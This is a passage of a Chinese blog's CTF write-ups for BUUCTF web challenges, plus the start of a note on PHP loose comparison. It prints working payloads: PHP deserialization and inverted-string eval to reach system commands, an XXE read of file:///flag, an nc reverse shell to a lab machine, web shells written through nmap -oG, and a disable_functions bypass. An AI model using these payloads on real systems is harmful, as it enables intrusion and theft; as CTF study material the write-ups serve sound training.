&#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>禁用了一大堆函数，但是有个很特别的东西：Test类中的两个成员属性恰好是要传入的参数名，且在类中有个<strong>destruct()魔术方法，会在反序列化结束时调用,在</strong>destruct()里面调用了gettime(),其参数就是Test类的两个成员属性,而且gettime并没有过滤disable_fun,这就很nice,可以通过反序列化函数unserialize()执行__destruct()函数，从而调用gettime函数，达到执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">        var <span class="variable">$p</span> = <span class="string">"ls"</span>;</span><br><span class="line">        var <span class="variable">$func</span> = <span class="string">"system"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span>=new Test();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:<span class="string">"Test"</span>:2:&#123;s:1:<span class="string">"p"</span>;s:2:<span class="string">"ls"</span>;s:4:<span class="string">"func"</span>;s:6:<span class="string">"system"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb3.jpg" alt=""><br>可以看到执行成功了，但是没发现flag,去根目录下找找<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb4.jpg" alt=""><br>还是没有。。。，最后在tmp下找到了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb5.jpg" alt=""><br>cat一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb6.jpg" alt=""></p>
<h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h3><p>查看源码，发现xml</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">doLogin</span></span>()&#123;</span><br><span class="line">	var username = $(<span class="string">"#username"</span>).val();</span><br><span class="line">	var password = $(<span class="string">"#password"</span>).val();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">""</span> || password == <span class="string">""</span>)&#123;</span><br><span class="line">		alert(<span class="string">"Please enter the username and password!"</span>);</span><br><span class="line">		<span class="built_in">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	var data = <span class="string">"&lt;user&gt;&lt;username&gt;"</span> + username + <span class="string">"&lt;/username&gt;&lt;password&gt;"</span> + password + <span class="string">"&lt;/password&gt;&lt;/user&gt;"</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        <span class="built_in">type</span>: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"doLogin.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/xml;charset=utf-8"</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: <span class="string">"xml"</span>,</span><br><span class="line">        anysc: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="keyword">function</span> (result) &#123;</span><br><span class="line">        	var code = result.getElementsByTagName(<span class="string">"code"</span>)[0].childNodes[0].nodeValue;</span><br><span class="line">        	var msg = result.getElementsByTagName(<span class="string">"msg"</span>)[0].childNodes[0].nodeValue;</span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">"0"</span>)&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(msg + <span class="string">" login fail!"</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">"1"</span>)&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(msg + <span class="string">" login success!"</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(<span class="string">"error:"</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="keyword">function</span> (XMLHttpRequest,textStatus,errorThrown) &#123;</span><br><span class="line">            $(<span class="string">".msg"</span>).text(errorThrown + <span class="string">':'</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以想到xxe，burp抓个包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/FakeXMLcookbook/Fakecookbook0.jpg" alt=""><br>构造一个外部实体，让它包含flag，将flag读出来,因为flag一般都在根目录，所以这里就直接读取file:///flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE zx [</span><br><span class="line">&lt;!ENTITY w1ndy SYSTEM <span class="string">"file:///flag"</span>&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;w1ndy;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/FakeXMLcookbook/Fakecookbook1.jpg" alt=""></p>
<h3 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger0.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger1.jpg" alt=""><br>查看下源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger2.jpg" alt=""><br>访问一下test.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger3.jpg" alt=""><br>根据首页的介绍，如果一个页面里有参数，就可以爆破，时间越长，爆破成功几率越大，如果点击check，就会停止爆破，结束进程。那这个页面就需要知道admin的密码，那就可以用首页那个工具来爆破这个密码<br>在工具框里输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://f2071973-205b-4598-81eb-84bdc383057e.node3.buuoj.cn/test.php</span><br></pre></td></tr></table></figure>
<p>点击input后开始爆破，刚开始我还傻傻的等，是真的慢。然后就点击了check<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger4.jpg" alt=""><br>感觉问题没这么简单，不可能让我们一直等吧。用burp抓了个包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger5.jpg" alt=""><br>第二个参数很像是base64编码，尝试解码，解码后是1594447625，像是时间戳,转换一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger6.jpg" alt=""><br>还真是时间戳,尝试修改值为10(base64编码一下):MTA%3D,forward后弹出一个窗口<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger7.jpg" alt=""><br>av11664517，B站av号，后面的应该是时间戳，转换一下：2020-03-12 11:53:23<br>去B站搜一下,是个讲量子力学的视频，那个时间猜测是评论的时间<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger8.jpg" alt=""></p>
<h3 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell0.jpg" alt=""><br>.swp源码泄露,访问.index.php.swp,下载下来后用需要恢复，命令如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>
<p>恢复之后打开，就是源码了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'girl_friend'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    die(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$girl</span> = <span class="variable">$_POST</span>[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, <span class="variable">$girl</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, <span class="variable">$girl</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        //duangShell~~~~</span><br><span class="line">        <span class="built_in">exec</span>(<span class="variable">$girl</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这过滤的让人无从下手啊，看了师傅们的wp,说说是反弹shell,涨姿势了<br>因为需要用到另一台机器，就在BUU上申请了个小号，开了一台linux labs实验机<br>xshell连一下：用户名：root,密码：123456,主机：node3.buuoj.cn，端口是随机分配的，我这里的端口是27369<br>连上之后，查看一下实验机的ip,我这台是174.2.44.59,然后监听一下端口，我这选择监听4444端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
<p>然后在题目那里post数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">girl_friend=nc 174.2.44.59 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
<p>然后实验机这边就会监听到<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell1.jpg" alt=""><br>找一下flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell2.jpg" alt=""><br>cat一下flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell3.jpg" alt=""></p>
<h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite0.jpg" alt=""><br>查看源码,发现js代码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite1.jpg" alt=""><br>很明显有个flag.php,直接去访问<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite2.jpg" alt=""><br>除了购买者和他自己的ip能通过，别的无法通过，很容易想到伪造X-Forwarded-For:127.0.0.1<br>我这里用的是个插件X-Forwarded-For Header<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite3.jpg" alt=""></p>
<h3 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h3><p>这个题脑洞有点大啊，看了大佬的wp深感佩服<br>查看源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster0.jpg" alt=""><br>可以看到,hidden的id是16进制的，解码后为Po.，尝试访问Po.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster1.jpg" alt=""><br>Po是一种化学元素，中文名为钋，根据题目，大佬说是要遍历元素周期表了，写个脚本跑一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">'http://18bffb99-f7e6-4e79-a76b-0e4ab899a2b1.node3.buuoj.cn/'</span></span><br><span class="line">elements=[<span class="string">'H'</span>, <span class="string">'He'</span>, <span class="string">'Li'</span>, <span class="string">'Be'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'F'</span>, <span class="string">'Ne'</span>, <span class="string">'Na'</span>, <span class="string">'Mg'</span>, <span class="string">'Al'</span>, <span class="string">'Si'</span>, <span class="string">'P'</span>, <span class="string">'S'</span>, <span class="string">'Cl'</span>, <span class="string">'Ar'</span>,</span><br><span class="line">        <span class="string">'K'</span>, <span class="string">'Ca'</span>, <span class="string">'Sc'</span>, <span class="string">'Ti'</span>, <span class="string">'V'</span>, <span class="string">'Cr'</span>, <span class="string">'Mn'</span>, <span class="string">'Fe'</span>, <span class="string">'Co'</span>, <span class="string">'Ni'</span>, <span class="string">'Cu'</span>, <span class="string">'Zn'</span>, <span class="string">'Ga'</span>, <span class="string">'Ge'</span>, <span class="string">'As'</span>, <span class="string">'Se'</span>, <span class="string">'Br'</span>,</span><br><span class="line">        <span class="string">'Kr'</span>, <span class="string">'Rb'</span>, <span class="string">'Sr'</span>, <span class="string">'Y'</span>, <span class="string">'Zr'</span>, <span class="string">'Nb'</span>, <span class="string">'Mo'</span>, <span class="string">'Te'</span>, <span class="string">'Ru'</span>, <span class="string">'Rh'</span>, <span class="string">'Pd'</span>, <span class="string">'Ag'</span>, <span class="string">'Cd'</span>, <span class="string">'In'</span>, <span class="string">'Sn'</span>, <span class="string">'Sb'</span>, <span class="string">'Te'</span>,</span><br><span class="line">        <span class="string">'I'</span>, <span class="string">'Xe'</span>, <span class="string">'Cs'</span>, <span class="string">'Ba'</span>, <span class="string">'La'</span>, <span class="string">'Ce'</span>, <span class="string">'Pr'</span>, <span class="string">'Nd'</span>, <span class="string">'Pm'</span>, <span class="string">'Sm'</span>, <span class="string">'Eu'</span>, <span class="string">'Gd'</span>, <span class="string">'Tb'</span>, <span class="string">'Dy'</span>, <span class="string">'Ho'</span>, <span class="string">'Er'</span>, <span class="string">'Tm'</span>,</span><br><span class="line">        <span class="string">'Yb'</span>, <span class="string">'Lu'</span>, <span class="string">'Hf'</span>, <span class="string">'Ta'</span>, <span class="string">'W'</span>, <span class="string">'Re'</span>, <span class="string">'Os'</span>, <span class="string">'Ir'</span>, <span class="string">'Pt'</span>, <span class="string">'Au'</span>, <span class="string">'Hg'</span>, <span class="string">'Tl'</span>, <span class="string">'Pb'</span>, <span class="string">'Bi'</span>, <span class="string">'Po'</span>, <span class="string">'At'</span>, <span class="string">'Rn'</span>,</span><br><span class="line">        <span class="string">'Fr'</span>, <span class="string">'Ra'</span>, <span class="string">'Ac'</span>, <span class="string">'Th'</span>, <span class="string">'Pa'</span>, <span class="string">'U'</span>, <span class="string">'Np'</span>, <span class="string">'Pu'</span>, <span class="string">'Am'</span>, <span class="string">'Cm'</span>, <span class="string">'Bk'</span>, <span class="string">'Cf'</span>, <span class="string">'Es'</span>, <span class="string">'Fm'</span>,<span class="string">'Md'</span>, <span class="string">'No'</span>, <span class="string">'Lr'</span>,</span><br><span class="line">        <span class="string">'Rf'</span>, <span class="string">'Db'</span>, <span class="string">'Sg'</span>, <span class="string">'Bh'</span>, <span class="string">'Hs'</span>, <span class="string">'Mt'</span>, <span class="string">'Ds'</span>, <span class="string">'Rg'</span>, <span class="string">'Cn'</span>, <span class="string">'Nh'</span>, <span class="string">'Fl'</span>, <span class="string">'Mc'</span>, <span class="string">'Lv'</span>, <span class="string">'Ts'</span>, <span class="string">'Og'</span>, <span class="string">'Uue'</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> elements:</span><br><span class="line">    r=requests.get(url+i+<span class="string">'.php'</span>)</span><br><span class="line">    <span class="keyword">if</span>(r.status_code==200):</span><br><span class="line">        flag+=r.text</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster2.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster3.jpg" alt=""></p>
<h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;40)&#123;</span><br><span class="line">        die(<span class="string">"This is too Long."</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        die(<span class="string">"NO."</span>);</span><br><span class="line">    @<span class="built_in">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>
<p>字母数字全都过滤了，考虑urlencode取反绕过<br>先看一下phpinfo()</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> urlencode(~<span class="string">'phpinfo'</span>);</span><br><span class="line">?&gt;</span><br><span class="line">结果：%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME0.jpg" alt=""><br>禁了很多系统函数，同样的构造取反一句话</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = urlencode(~<span class="string">'assert'</span>);</span><br><span class="line"><span class="variable">$b</span> = urlencode(~<span class="string">'(eval($_POST["w1ndy"]))'</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'?code=(~'</span>.<span class="variable">$a</span>.<span class="string">')'</span>.<span class="string">'(~'</span>.<span class="variable">$b</span>.<span class="string">');'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%88%CE%91%9B%86%DD%A2%D6%D6);</span><br></pre></td></tr></table></figure>
<p>蚁剑连上后，因为shell命令被ban了，所以没法直接打开文件，终端也无法使用，我们需要绕过disable_functions,蚁剑刚好有一个这样的插件，但是蚁剑的插件中心挂掉了，一直加载不出来，在网上找到了解决办法<br><a href="https://github.com/Medicean/as_bypass_php_disable_functions/tree/7d28318c5f0a795dc96bda95e37d04a05b5bf2a2" target="_blank" rel="noopener">https://github.com/Medicean/as_bypass_php_disable_functions/tree/7d28318c5f0a795dc96bda95e37d04a05b5bf2a2</a><br>下载下来解压后将其放到antData/plugins目录下，重启蚁剑，就能看见插件了<br>接下来使用该插件来绕过disable_functions<br>右键目标项，加载插件–&gt;辅助工具–&gt;目标插件<br>进入后，选择模式，这里选择PHP_GC_UAF<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME1.jpg" alt=""><br>点击开始，就会进入终端<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME2.jpg" alt=""></p>
<h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap0.jpg" alt=""><br>这个和之前做的OnlineTool很像，直接把payload拿过来测试一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'&lt;?php @eval($_POST["pass"]); ?&gt; -oG test.php'</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap1.jpg" alt=""><br>猜测过滤了&lt;?,用js来调用php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'&lt;script language=‘php‘&gt;@eval($_POST['</span>pass<span class="string">']);&lt;/script&gt; -oG test.php'</span></span><br></pre></td></tr></table></figure>
<p>结果还是一样，那就应该是过滤了php,使用短标签绕过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'&lt;?= @eval($_POST["pass"]);?&gt; -oG test.phtml'</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap2.jpg" alt=""><br>成功写入，蚁剑连接一下，在根目录找到flag</p>
<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p>查看源码，发现time.php?source<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ReadlezPHP/ReadlezPHP0.jpg" alt=""><br>访问time.php?source</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable">$this</span>-&gt;b;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = new HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>
<p>反序列化，在__destruct中可以看到，$b($a)，即$b作为函数名，$a作为函数的参数，那这里就可构造代码执行，先看一下phpinfo()</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = new HelloPhp();</span><br><span class="line"><span class="variable">$c</span>-&gt;a=<span class="string">'phpinfo()'</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;b=<span class="string">"assert"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?data=O:8:<span class="string">"HelloPhp"</span>:2:&#123;s:1:<span class="string">"a"</span>;s:9:<span class="string">"phpinfo()"</span>;s:1:<span class="string">"b"</span>;s:6:<span class="string">"assert"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>在phpinfo()中发现flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ReadlezPHP/ReadlezPHP1.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>php弱类型</title>
    <url>/2019/11/25/CTFWebNotes/</url>
    <content><![CDATA[<p>PHP中由两个比较符号：== 和 ===<br>== 在进行比较时，会先将两个字符串的类型转为同一类型，然后比较值，若有一方为字符串或为空，会先把非数字一方转换为0，再做比较<br>=== 在比较时，会先判断两个字符串的类型是否一样，再比较值是否一样<br>如果是数字和字符串比较，或者是比较的字符串中含有数字的，那么字符串会先被转换为数值，然后再比较数值<br>特别的：0e开头且0e以后的全为数字的字符串在判断==时，均会转换为0</p>
<a id="more"></a>
<h2 id="比较时字符串转换问题"><a href="#比较时字符串转换问题" class="headerlink" title="== 比较时字符串转换问题"></a>== 比较时字符串转换问题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a1</span>=0;</span><br><span class="line"><span class="variable">$b1</span>=<span class="string">"abc"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a1</span>==<span class="variable">$b1</span>) // <span class="string">"abc"</span>会被转换为0，a1==b1==0,结果为真</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"true"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a2</span>=23;</span><br><span class="line"><span class="variable">$b2</span>=<span class="string">"abc"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>==<span class="variable">$b</span>) // <span class="string">"abc"</span>会被转换为0，但(a2=23) != (b=0),结果为假</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"true"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$md51</span> = md5(<span class="string">'240610708'</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$md52</span> = @md5(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$a</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span> != <span class="string">'QNKCDZO'</span> &amp;&amp; <span class="variable">$md51</span>==<span class="variable">$md52</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>用get方法传入一个参数a,要让md5(‘240610708’)==md5(a)成立，且a!=QNKCDZO,而md5(‘240610708’)=0e462097431906509019562988736854，根据上面关于字符串与数值比较分析，此处0e462097431906509019562988736854转换为数值后的结果为0，所以只需要找一个md5以后以0e开头的字符串即可<br>例子：QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a</p>
